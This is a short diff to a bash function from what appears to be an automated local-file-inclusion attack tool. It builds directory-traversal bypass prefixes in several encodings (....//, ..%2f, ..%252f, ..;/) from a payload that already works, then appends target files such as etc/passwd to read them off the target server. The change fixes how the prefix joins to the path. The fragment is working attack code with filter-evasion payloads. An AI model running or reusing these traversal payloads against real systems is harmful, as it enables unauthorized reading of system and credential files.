@@ -330,9 +330,14 @@ _lfi_auto_read() {
   mkdir -p "$lfi_reads_dir"
 
   # Extract the bypass pattern from the working payload
+  # Build bypass prefix from the working payload pattern
+  # IMPORTANT: prefix must end with the traversal separator so target_file
+  # (e.g. "etc/passwd") is appended correctly as ".../etc/passwd"
   local bypass_prefix=""
   if [[ "$working_payload" == *"....//..../"* ]]; then
     bypass_prefix="....//....//....//....//....//....//....//....//....//..../"
+    # Ensure the join produces ....//etc/passwd not ..../etc/passwd
+    bypass_prefix+="/"
   elif [[ "$working_payload" == *"..%2f"* ]]; then
     bypass_prefix="..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f"
   elif [[ "$working_payload" == *"..%252f"* ]]; then
@@ -342,7 +347,7 @@ _lfi_auto_read() {
   elif [[ "$working_payload" == *"..;/"* ]]; then
     bypass_prefix="..;/..;/..;/..;/..;/..;/..;/..;/"
   else
-    # Standard traversal
+    # Standard traversal — ends with / so etc/passwd becomes /etc/passwd
     bypass_prefix="../../../../../../../../../../../../"
   fi
 
